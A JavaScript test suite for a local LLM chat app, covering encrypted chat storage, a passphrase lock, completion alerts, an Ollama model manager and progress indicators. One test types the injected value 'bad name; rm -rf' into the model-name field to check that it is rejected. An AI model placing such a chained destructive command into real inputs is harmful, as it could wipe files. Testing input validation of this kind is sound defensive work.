const asText = value => JSON.stringify(value, (_key, item) => item instanceof ArrayBuffer || ArrayBuffer.isView(item) ? Buffer.from(item.buffer || item).toString('latin1') : (item && item.constructor && item.constructor.name === 'ArrayBuffer' ? Buffer.from(new Uint8Array(item)).toString('latin1') : item));

test('messages and thread details are encrypted at rest and still fully usable', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  for (const name of ['autoTitle', 'suggestedFollowUps', 'autoFactCheck', 'learnMemories']) app.window.localStorage.setItem(name, 'false');
  app.window.fetch = async url => String(url).endsWith('/api/chat') ? Response.json({ message: { content: 'The launch code is PELICAN-7.' } }) : Response.json({ models: [], data: [] });
  app.document.getElementById('userInput').value = 'Remember the ZANZIBAR project budget';
  await app.run('sendMessage()');
  await app.run('updateThread(currentThreadId, thread => { thread.name = "Secret roadmap"; thread.systemPrompt = "Be terse about MARMALADE"; })');
  app.run('currentThreadParams = { temperature: 0.3, topP: 0.5, repeatPenalty: 1.2 }; saveThreadParams()');
  await app.run('threadUpdateQueue');
  const raw = await rawStores(app);
  assert.equal(raw.messages.length, 2);
  for (const record of [...raw.messages, ...raw.threads]) {
    assert.equal(record.encrypted, true);
    assert.equal(record.text, undefined); assert.equal(record.name, undefined); assert.equal(record.systemPrompt, undefined);
  }
  const stored = asText(raw);
  for (const secret of ['ZANZIBAR', 'PELICAN', 'Secret roadmap', 'MARMALADE']) assert(!stored.includes(secret), secret + ' is readable in storage');
  assert.deepEqual(Object.keys(raw.messages[0]).sort(), ['ciphertext', 'cryptoId', 'encrypted', 'id', 'iv', 'role', 'threadId', 'timestamp', 'type', 'version']);
  // Everything that reads chats still sees them.
  const messages = normalize(await app.run('getThreadMessages(currentThreadId)'));
  assert.deepEqual(messages.map(message => message.text), ['Remember the ZANZIBAR project budget', 'The launch code is PELICAN-7.']);
  assert.equal(normalize(await app.run('getThreadMessages(currentThreadId, 1)')).length, 1);
  const thread = normalize(await app.run('getThreadRecord(currentThreadId)'));
  assert.equal(thread.name, 'Secret roadmap'); assert.equal(thread.temperature, 0.3); assert.equal(thread.repeatPenalty, 1.2);
  assert.equal(await app.run('getThreadSystemPrompt(currentThreadId)'), 'Be terse about MARMALADE');
  await app.run('loadThreads()');
  assert(app.document.getElementById('threadsList').textContent.includes('Secret roadmap'));
  const found = normalize(await app.run('searchMessages("pelican")'));
  assert.equal(found.length, 1); assert.equal(found[0].threadName, 'Secret roadmap');
  const snapshot = normalize(await app.run('readBackupSnapshot()'));
  assert.equal(snapshot.threads[0].name, 'Secret roadmap'); assert.equal(snapshot.messages[1].text, 'The launch code is PELICAN-7.');
  // A branch copies the conversation into a new encrypted thread.
  await app.run(`branchFromMessage(${messages[1].id})`);
  const branched = normalize(await app.run('getThreadMessages(currentThreadId)'));
  assert.deepEqual(branched.map(message => message.text), messages.map(message => message.text));
  assert.equal(normalize(await app.run('getThreadRecord(currentThreadId)')).name, 'Secret roadmap (branch)');
  assert(!asText(await rawStores(app)).includes('PELICAN'));
  // A record damaged in storage is reported, not thrown.
  await app.run('new Promise(resolve=>{const tx=db.transaction(["messages"],"readwrite");const store=tx.objectStore("messages");store.get(1).onsuccess=e=>{const r=e.target.result;r.cryptoId="tampered";store.put(r);};tx.oncomplete=resolve;})');
  const damaged = normalize(await app.run('getThreadMessages(1)'));
  assert.equal(damaged[0].unreadable, true);
  assert.equal(damaged[1].text, 'The launch code is PELICAN-7.');
});

test('chats written by earlier versions are encrypted once, without loss', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  await app.run(`new Promise(resolve=>{
    const tx=db.transaction(["threads","messages","vault"],"readwrite");
    tx.objectStore("threads").add({id:50,name:"Legacy plans",systemPrompt:"Old prompt",temperature:0.4,created:5});
    for(let i=0;i<230;i++) tx.objectStore("messages").add({threadId:50,role:i%2?"assistant":"user",text:"Legacy message "+i,type:"text",timestamp:i+1,citations:[{url:"https://example.com/"+i}]});
    tx.objectStore("vault").delete("chatsEncrypted");
    tx.oncomplete=resolve;})`);
  assert(asText(await rawStores(app)).includes('Legacy message 7'));
  assert.equal(normalize(await app.run('getThreadMessages(50)')).length, 230, 'plaintext records are readable before migration');
  const migrated = await app.run('migratePlaintextChats()');
  assert.equal(migrated, 231);
  const raw = await rawStores(app);
  assert(raw.messages.every(record => record.encrypted === true) && raw.threads.every(record => record.encrypted === true));
  assert(!asText(raw).includes('Legacy'));
  const messages = normalize(await app.run('getThreadMessages(50)'));
  assert.equal(messages.length, 230);
  assert.equal(messages[229].text, 'Legacy message 229');
  assert.equal(messages[3].citations[0].url, 'https://example.com/3');
  const thread = normalize(await app.run('getThreadRecord(50)'));
  assert.deepEqual([thread.name, thread.systemPrompt, thread.temperature, thread.created], ['Legacy plans', 'Old prompt', 0.4, 5]);
  assert.equal(await app.run('migratePlaintextChats()'), 0, 'the migration runs once');
});

async function seedVault(app) {
  await app.run(`(async()=>{
    await saveMessage({role:"user",text:"Locked message ALBATROSS",type:"text",timestamp:1},1);
    const payload={name:"Private.pdf",type:"pdf",size:10,fullText:"Document fact HERON",chunks:[{text:"Document fact HERON",page:1,lineStart:1,lineEnd:1}],tokenEstimate:5};
    const encrypted=await encryptDocumentPayload(payload,1);
    await new Promise(resolve=>{const tx=db.transaction(["documents"],"readwrite");tx.objectStore("documents").add({threadId:1,contentHash:"h",createdAt:1,...encrypted});tx.oncomplete=resolve;});
    await saveMemoryCandidate({fact:"Prefers the codename IBIS",key:"user:codename"},1,true);
    await setApiKey("tavilyApiKey","tvly-SECRET-KEY");
  })()`);
}
async function readEverything(app) {
  return normalize(await app.run(`(async()=>({
    messages:(await getThreadMessages(1)).map(m=>m.text),
    documents:(await getThreadDocuments(1)).map(d=>d.fullText),
    memories:(await loadAllMemories()).map(m=>m.fact),
    thread:(await getThreadRecord(1)).name
  }))()`));
}
const expectedEverything = { messages: ['Locked message ALBATROSS'], documents: ['Document fact HERON'], memories: ['Prefers the codename IBIS'], thread: 'General' };

test('a passphrase lock leaves no usable key in storage and unlocks only with the passphrase', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  await seedVault(app);
  await assert.rejects(app.run('enablePassphraseLock("short")'), /at least 8 characters/);
  const progress = [];
  app.window.lockProgress = (done, total) => progress.push([done, total]);
  const result = normalize(await app.run('enablePassphraseLock("correct horse battery", lockProgress)'));
  assert.equal(result.skipped, 0);
  assert(progress.length > 0);
  assert.equal(await app.run('vaultRequest("readonly", store => store.get("masterKey"))'), undefined, 'the unwrapped key is gone');
  const lock = normalize(await app.run('vaultRequest("readonly", store => store.get("lock"))'));
  assert.deepEqual([lock.version, lock.kdf, lock.iterations], [1, 'PBKDF2-SHA256', 600000]);
  assert.equal(app.run('vaultLockEnabled'), true);
  assert.deepEqual(await readEverything(app), expectedEverything, 'data is readable in the session that set the lock');
  // A fresh start: no key in memory, so the unlock screen appears and blocks until the passphrase is right.
  app.run('vaultKey = null; Object.keys(apiKeyCache).forEach(name => delete apiKeyCache[name]);');
  let opened = false;
  const opening = app.run('initializeSecretVault()').then(() => { opened = true; });
  await settle();
  assert(app.document.getElementById('lockOverlay').classList.contains('active'));
  assert(app.document.body.classList.contains('vault-locked'));
  await assert.rejects(app.run('sealChatRecord("message", {text:"x"}, MESSAGE_PUBLIC_FIELDS)'), /locked/);
  assert.equal(normalize(await app.run('getThreadMessages(1)'))[0].unreadable, true, 'nothing decrypts while locked');
  app.document.getElementById('unlockPassphrase').value = 'wrong passphrase';
  await app.run('submitUnlock()');
  assert.equal(app.document.getElementById('unlockStatus').textContent, 'That passphrase is not correct.');
  assert.equal(opened, false);
  app.document.getElementById('unlockPassphrase').value = 'correct horse battery';
  await app.run('submitUnlock()');
  await opening;
  assert.equal(opened, true);
  assert(!app.document.getElementById('lockOverlay').classList.contains('active'));
  assert.equal(app.document.getElementById('unlockPassphrase').value, '');
  assert.deepEqual(await readEverything(app), expectedEverything);
  assert.equal(app.run('getApiKey("tavilyApiKey")'), 'tvly-SECRET-KEY');
  assert.equal(app.run('vaultKey.extractable'), false);
  // Changing the passphrase re-wraps the same key.
  await assert.rejects(app.run('changeLockPassphrase("not it", "another long passphrase")'), /not correct/);
  await app.run('changeLockPassphrase("correct horse battery", "another long passphrase")');
  const relocked = normalize(await app.run('vaultRequest("readonly", store => store.get("lock"))'));
  app.window.lockFixture = relocked;
  await assert.rejects(app.run('unwrapVaultKey(lockFixture, "correct horse battery")'), /not correct/);
  assert.equal((await app.run('unwrapVaultKey(lockFixture, "another long passphrase")')).type, 'secret');
  // Removing the lock needs the passphrase and rewrites no data.
  await assert.rejects(app.run('disablePassphraseLock("guess")'), /not correct/);
  await app.run('disablePassphraseLock("another long passphrase")');
  assert.equal(await app.run('vaultRequest("readonly", store => store.get("lock"))'), undefined);
  assert.equal((await app.run('vaultRequest("readonly", store => store.get("masterKey"))')).extractable, false);
  app.run('vaultKey = null');
  await app.run('initializeSecretVault()');
  assert.deepEqual(await readEverything(app), expectedEverything);
});

test('setting a lock is all-or-nothing and refused while a reply is being generated', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  await seedVault(app);
  app.run('beginForegroundRequest()');
  await assert.rejects(app.run('enablePassphraseLock("correct horse battery")'), /current response/);
  app.run('resetComposerForThreadChange()');
  // Make the final write fail part-way through: nothing may change.
  app.run('const realReencrypt = reencryptEverything; reencryptEverything = async (...args) => { const out = await realReencrypt(...args); out.threads.push({ id: 999, created(){} }); return out; };');
  await assert.rejects(app.run('enablePassphraseLock("correct horse battery")'));
  await settle();
  assert.equal(app.run('vaultLockEnabled'), false);
  assert.equal(app.run('lockOperationPending'), false);
  assert.equal(await app.run('vaultRequest("readonly", store => store.get("lock"))'), undefined);
  assert((await app.run('vaultRequest("readonly", store => store.get("masterKey"))')));
  assert.deepEqual(await readEverything(app), expectedEverything);
  app.run('vaultKey = null');
  await app.run('initializeSecretVault()');
  assert.deepEqual(await readEverything(app), expectedEverything, 'the original key still opens everything');
});

test('the lock dialog validates input and reports the outcome', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  app.run('openSettings()');
  assert.equal(app.document.getElementById('lockEnableButton').style.display, '');
  assert.equal(app.document.getElementById('lockNowButton').style.display, 'none');
  app.run('openLockDialog("enable")');
  assert.equal(app.document.getElementById('lockCurrentRow').hidden, true);
  app.document.getElementById('lockNewPassphrase').value = 'a long passphrase';
  app.document.getElementById('lockConfirmPassphrase').value = 'a different one';
  await app.run('runLockDialog()');
  assert.equal(app.document.getElementById('lockDialogStatus').textContent, 'The passphrases do not match.');
  app.document.getElementById('lockConfirmPassphrase').value = 'a long passphrase';
  await app.run('runLockDialog()');
  assert(app.document.getElementById('lockDialogStatus').textContent.startsWith('Lock set.'));
  assert.equal(app.document.getElementById('lockNewPassphrase').value, '');
  app.run('closeLockDialog(); openSettings()');
  assert(app.document.getElementById('lockStatusText').textContent.startsWith('On'));
  assert.equal(app.document.getElementById('lockEnableButton').style.display, 'none');
  assert.equal(app.document.getElementById('autoLockRow').style.display, '');
  app.run('closeSettings(); openLockDialog("disable")');
  assert.equal(app.document.getElementById('lockNewRow').hidden, true);
  app.document.getElementById('lockCurrentPassphrase').value = 'a long passphrase';
  await app.run('runLockDialog()');
  assert.equal(app.document.getElementById('lockDialogStatus').textContent, 'Lock removed.');
  assert.equal(app.run('vaultLockEnabled'), false);
});

test('the screen wake lock is held only while work is running and the setting is on', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const events = [];
  Object.defineProperty(app.window.navigator, 'wakeLock', { configurable: true, value: { request: async type => { events.push('request:' + type); return { release: async () => { events.push('release'); }, addEventListener() {} }; } } });
  app.run('beginForegroundRequest()');
  await settle();
  assert.deepEqual(events, ['request:screen']);
  app.run('beginForegroundRequest()');
  await settle();
  assert.deepEqual(events, ['request:screen'], 'a second request reuses the lock');
  app.run('endForegroundRequest(activeRequestController)');
  await settle();
  assert.deepEqual(events, ['request:screen', 'release']);
  app.window.localStorage.setItem('keepAwake', 'false');
  app.run('beginForegroundRequest()');
  await settle();
  assert.equal(events.length, 2, 'nothing is requested when the setting is off');
  app.run('resetComposerForThreadChange()');
});

test('a background completion alert carries no message text and stays silent in the foreground', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  for (const name of ['autoTitle', 'suggestedFollowUps', 'autoFactCheck', 'learnMemories']) app.window.localStorage.setItem(name, 'false');
  const shown = [];
  class FakeNotification { constructor(title, options) { shown.push({ title, ...options }); } close() {} }
  FakeNotification.permission = 'granted';
  app.window.Notification = FakeNotification;
  app.run('Notification = window.Notification');
  let hidden = false;
  Object.defineProperty(app.document, 'hidden', { configurable: true, get: () => hidden });
  app.document.hasFocus = () => !hidden;
  app.window.fetch = async url => String(url).endsWith('/api/chat') ? Response.json({ message: { content: 'Confidential reply about OSPREY' } }) : Response.json({ models: [], data: [] });
  const send = async () => { app.document.getElementById('userInput').value = 'Confidential question about KESTREL'; await app.run('sendMessage()'); await settle(); };
  await send();
  assert.equal(shown.length, 0, 'off by default');
  app.window.localStorage.setItem('completionAlert', 'true');
  await send();
  assert.equal(shown.length, 0, 'no alert while the app is in front');
  hidden = true;
  await send();
  assert.equal(shown.length, 1);
  assert.equal(shown[0].title, 'PrivateLLMLens');
  assert(/^Your reply is ready/.test(shown[0].body));
  assert(!/OSPREY|KESTREL|General/.test(JSON.stringify(shown[0])));
  assert(app.document.title.startsWith('✓ Reply ready'));
  hidden = false;
  app.document.dispatchEvent(new app.window.Event('visibilitychange'));
  assert.equal(app.document.title, 'PrivateLLMLens');
  // A failure is announced too, and a blocked permission falls back without throwing.
  hidden = true;
  app.window.fetch = async url => String(url).endsWith('/api/chat') ? new Response('', { status: 500 }) : Response.json({ models: [], data: [] });
  await send();
  assert.equal(shown.at(-1).body, 'The request stopped with an error.');
  FakeNotification.permission = 'denied';
  const outcome = normalize(await app.run('announceCompletion({ ok: true, elapsedSeconds: 42 })'));
  assert.deepEqual([outcome.alerted, outcome.notified, outcome.body], [true, false, 'Your reply is ready (42s).']);
});

function ndjsonResponse(lines) {
  const encoder = new TextEncoder();
  return new Response(new ReadableStream({ start(controller) { lines.forEach(line => controller.enqueue(encoder.encode(JSON.stringify(line) + '\n'))); controller.close(); } }));
}

test('the model manager lists, unloads, deletes and downloads Ollama models', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const calls = [];
  let installed = [{ name: 'qwen3:4b', size: 2.6e9, details: { parameter_size: '4.0B', quantization_level: 'Q4_K_M' } }, { name: 'nomic-embed-text:latest', size: 2.7e8, details: {} }];
  let loaded = [{ name: 'qwen3:4b', size_vram: 3.1e9, context_length: 16384, expires_at: new Date(Date.now() + 240000).toISOString() }];
  app.window.fetch = async (url, options = {}) => {
    const path = new URL(String(url)).pathname, body = options.body ? JSON.parse(options.body) : null;
    calls.push({ path, method: options.method || 'GET', body });
    if (path === '/api/tags') return Response.json({ models: installed });
    if (path === '/api/ps') return Response.json({ models: loaded });
    if (path === '/api/version') return Response.json({ version: '0.40.13' });
    if (path === '/api/show') return Response.json({ capabilities: ['completion'] });
    if (path === '/api/generate') { if (body.model.includes('embed')) return Response.json({ error: 'does not support generate' }, { status: 400 }); loaded = loaded.filter(model => model.name !== body.model); return Response.json({ done: true }); }
    if (path === '/api/embed') { loaded = loaded.filter(model => model.name !== body.model); return Response.json({ embeddings: [] }); }
    if (path === '/api/delete') { installed = installed.filter(model => model.name !== body.model); return new Response('', { status: 200 }); }
    if (path === '/api/pull') {
      if (body.model === 'missing:model') return ndjsonResponse([{ status: 'pulling manifest' }, { error: 'pull model manifest: file does not exist' }]);
      installed = [...installed, { name: body.model, size: 1e9, details: {} }];
      return ndjsonResponse([{ status: 'pulling manifest' }, { status: 'pulling aabbccddeeff', digest: 'sha256:aa', total: 1000, completed: 250 }, { status: 'pulling aabbccddeeff', digest: 'sha256:aa', total: 1000, completed: 1000 }, { status: 'verifying sha256 digest' }, { status: 'success' }]);
    }
    return Response.json({ data: [] });
  };
  app.run('openModelManager()');
  await app.run('refreshModelManager()');
  const text = id => app.document.getElementById(id).textContent;
  assert(text('modelManagerStatus').includes('Ollama 0.40.13') && text('modelManagerStatus').includes('2 models'));
  assert(text('loadedModelsList').includes('qwen3:4b') && text('loadedModelsList').includes('16K context') && text('loadedModelsList').includes('unloads in 4 min'));
  assert(text('installedModelsList').includes('Q4_K_M') && text('installedModelsList').includes('nomic-embed-text'));
  await app.run('unloadOllamaModel("qwen3:4b")');
  assert.deepEqual(calls.find(call => call.path === '/api/generate').body, { model: 'qwen3:4b', keep_alive: 0 });
  assert(text('loadedModelsList').includes('Nothing loaded'));
  loaded = [{ name: 'nomic-embed-text:latest', size_vram: 3e8 }];
  await app.run('unloadOllamaModel("nomic-embed-text:latest")');
  assert.deepEqual(calls.find(call => call.path === '/api/embed').body, { model: 'nomic-embed-text:latest', keep_alive: 0, input: '' });
  await app.run('deleteOllamaModel("nomic-embed-text:latest")');
  const deletion = calls.find(call => call.path === '/api/delete');
  assert.deepEqual([deletion.method, deletion.body], ['DELETE', { model: 'nomic-embed-text:latest' }]);
  assert(!text('installedModelsList').includes('nomic-embed-text'));
  // Download with progress, then an error from the registry, then a rejected name.
  app.document.getElementById('modelPullName').value = 'gemma3:1b';
  assert.equal(await app.run('pullOllamaModel()'), true);
  assert.equal(text('modelPullStatus'), 'gemma3:1b is ready to use.');
  assert.equal(app.document.getElementById('modelPullMeter').getAttribute('aria-valuenow'), '100');
  assert(text('installedModelsList').includes('gemma3:1b'));
  assert.equal(app.document.getElementById('modelPullButton').textContent, 'Download');
  app.document.getElementById('modelPullName').value = 'missing:model';
  assert.equal(await app.run('pullOllamaModel()'), false);
  assert(text('modelPullStatus').includes('file does not exist'));
  const pulls = calls.filter(call => call.path === '/api/pull').length;
  app.document.getElementById('modelPullName').value = 'bad name; rm -rf';
  await app.run('pullOllamaModel()');
  assert.equal(calls.filter(call => call.path === '/api/pull').length, pulls, 'an invalid name is never sent');
  assert.equal(app.run('longTaskCount'), 0);
  app.run('closeModelManager()');
  // An unreachable server is stated plainly.
  app.window.fetch = async () => { throw new TypeError('Failed to fetch'); };
  await app.run('refreshModelManager()');
  assert(text('modelManagerStatus').startsWith('Ollama is not reachable'));
});

// ---- Visible progress while waiting (2.5.1) ----

test('every waiting step shows what is happening, any count, and a running clock', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const element = app.document.createElement('div');
  app.window.stageElement = element;
  element.dataset.startedAt = String(Date.now() - 42500);
  app.run('setProcessingLabel(stageElement, "Indexing Report.pdf", "passages 9–16 of 56")');
  assert.equal(element.querySelector('.stage-label').textContent, 'Indexing Report.pdf');
  assert(element.querySelector('.thinking-dots'));
  assert.equal(element.querySelector('.stage-detail').textContent, 'passages 9–16 of 56');
  assert.equal(element.querySelector('.stage-elapsed').textContent, '42s');
  app.run('setProcessingLabel(stageElement, "Thinking")');
  assert.equal(element.querySelector('.stage-detail'), null);
  assert.equal(element.querySelector('.stage-elapsed').textContent, '42s');
  assert.equal(app.run('documentModeBadgeText("retrieval", null, "bm25")'), 'Retrieved passages · keyword search only');
  assert.equal(app.run('documentModeBadgeText("retrieval", null, "hybrid")'), 'Retrieved passages');
  assert.equal(app.run('documentModeBadgeText("direct")'), 'Full document');
  // No hand-built status lines remain that would lack the clock.
  assert(!/placeholder\.innerHTML = `\s*<span>[^<]+<\/span>\s*<span class="thinking-dots">/.test(html));
});

function fakeEmbeddingWorker(app) {
  const workers = [];
  app.window.Worker = class { constructor() { this.sent = []; this.terminated = false; workers.push(this); } postMessage(message) { this.sent.push(message); } terminate() { this.terminated = true; } };
  app.window.URL.createObjectURL = () => 'blob:test';
  app.run('persistDocumentEmbeddingCache = async () => {};');
  return workers;
}
const sampleDocs = () => [{ id: 1, name: 'Zoo.txt', chunks: [{ text: 'Okapi notes. '.repeat(200), lineStart: 1, lineEnd: 1 }, { text: 'Parking permits and catering. '.repeat(120), lineStart: 2, lineEnd: 2 }] }];

test('the search model reports download and indexing progress', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const workers = fakeEmbeddingWorker(app);
  const placeholder = app.document.createElement('div');
  app.document.body.appendChild(placeholder);
  app.window.stagePlaceholder = placeholder; app.window.docs = sampleDocs();
  app.run('beginForegroundRequest()');
  const ranking = app.run('rankDocumentChunksHybrid(docs, "When does the okapi house open?", stagePlaceholder)');
  await settle();
  const worker = workers[0];
  const label = () => placeholder.querySelector('.stage-label')?.textContent;
  const detail = () => placeholder.querySelector('.stage-detail')?.textContent || '';
  const say = data => { worker.onmessage({ data }); };
  say({ type: 'stage', stage: 'library' });
  assert.deepEqual([label(), detail()], ['Getting the search model ready', 'first use on this device']);
  say({ type: 'stage', stage: 'model' });
  say({ type: 'progress', file: 'model_quantized.onnx', loaded: 6 * 1048576, total: 24 * 1048576 });
  say({ type: 'progress', file: 'tokenizer.json', loaded: 1048576, total: 1048576 });
  assert.deepEqual([label(), detail()], ['Downloading search model', '7.0 of 25.0 MB']);
  assert.equal(app.document.getElementById('progressFill').style.width, '28%');
  assert.equal(app.document.querySelector('#processingProgress .progress-bar').style.display, 'block');
  say({ type: 'progress', file: 'model_quantized.onnx', loaded: 24 * 1048576, total: 24 * 1048576 });
  assert.equal(label(), 'Starting search model');
  say({ type: 'ready' });
  // Answer each batch and watch the passage count move.
  const seen = [];
  for (let guard = 0; guard < 20; guard++) {
    const request = worker.sent.find(message => !message.answered);
    if (!request) { await settle(); if (!worker.sent.find(message => !message.answered)) break; continue; }
    seen.push(`${label()} | ${detail()}`);
    request.answered = true;
    say({ type: 'result', id: request.id, embeddings: request.texts.map(() => Array.from({ length: 384 }, (_, i) => i === 0 ? 1 : 0)) });
    await settle();
  }
  const result = await ranking;
  assert.equal(result.method, 'hybrid');
  assert(seen.some(line => /^Indexing Zoo\.txt \| passages 1–\d+ of \d+$/.test(line)), JSON.stringify(seen));
  assert(seen.at(-1).startsWith('Finding the most relevant passages'));
  assert.equal(app.document.querySelector('#processingProgress .progress-bar').style.display, 'none', 'the bar is cleared afterwards');
  app.run('resetComposerForThreadChange()');
});

test('a search model that goes silent falls back to keyword search instead of hanging', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  const workers = fakeEmbeddingWorker(app);
  const placeholder = app.document.createElement('div');
  app.document.body.appendChild(placeholder);
  app.window.stagePlaceholder = placeholder;
  app.run('DOCUMENT_EMBEDDING_STALL_MS.loading = 300; DOCUMENT_EMBEDDING_STALL_MS.working = 300; beginForegroundRequest()');
  app.window.docs = sampleDocs();
  const started = Date.now();
  const first = await app.run('rankDocumentChunksHybrid(docs, "okapi", stagePlaceholder)');
  assert(Date.now() - started < 3000);
  assert.deepEqual([first.method, first.fallback], ['bm25', 'timeout']);
  assert(first.items.length > 0, 'keyword results are still returned');
  assert.equal(workers[0].terminated, true);
  assert.equal(placeholder.querySelector('.stage-label').textContent, 'Using keyword search');
  assert.equal(app.run('documentEmbeddingsDisabledForSession'), false, 'one slow start is retried next time');
  // Progress messages keep a slow download alive; silence afterwards still times out.
  app.window.docs = sampleDocs();
  const second = app.run('rankDocumentChunksHybrid(docs, "okapi", stagePlaceholder)');
  await settle();
  for (let i = 0; i < 5; i++) { await new Promise(resolve => setTimeout(resolve, 100)); workers[1].onmessage({ data: { type: 'progress', file: 'model.onnx', loaded: i, total: 10 } }); }
  assert.equal(workers[1].terminated, false, 'activity resets the limit');
  const outcome = await second;
  assert.equal(outcome.fallback, 'timeout');
  assert.equal(app.run('documentEmbeddingsDisabledForSession'), true, 'after two stalls it stops trying for the session');
  app.run('resetComposerForThreadChange()');
});

test('the status line stays until a reasoning model produces visible text', async t => {
  const app = createApp(); t.after(app.close); await app.boot();
  for (const name of ['autoTitle', 'suggestedFollowUps', 'autoFactCheck', 'learnMemories']) app.window.localStorage.setItem(name, 'false');
  let push, close;
  const encoder = new TextEncoder();
  const body = new ReadableStream({ start(controller) { push = value => controller.enqueue(encoder.encode(JSON.stringify(value) + '\n')); close = () => controller.close(); } });
  app.window.fetch = async url => String(url).endsWith('/api/chat') ? new Response(body) : Response.json({ models: [], data: [] });
  app.document.getElementById('userInput').value = 'Think hard';
  const sending = app.run('sendMessage()');
  const bubble = () => [...app.document.querySelectorAll('.assistant-message')].pop();
  for (let i = 0; i < 100 && !bubble()?.querySelector('.stage-label'); i++) await settle();
  assert.equal(bubble().querySelector('.stage-label').textContent, 'Thinking');
  assert(bubble().querySelector('.stage-elapsed'), 'the clock is present before any token arrives');
  push({ message: { thinking: 'Let me consider' } });
  await settle();
  assert.equal(bubble().querySelector('.stage-label').textContent, 'Reasoning');
  push({ message: { content: '<think>still private' } });
  await settle();
  assert.equal(bubble().querySelector('.stage-label').textContent, 'Reasoning', 'hidden reasoning does not blank the bubble');
  assert(!bubble().textContent.includes('still private'));
  push({ message: { content: '</think>The answer is 42.' } });
  await settle();
  assert.equal(bubble().querySelector('.stage-label'), null);
  assert(bubble().textContent.includes('The answer is 42.'));
  push({ done: true }); close();
  await sending;
  assert.equal(normalize(await app.run('getThreadMessages(currentThreadId)')).at(-1).text, 'The answer is 42.');
});
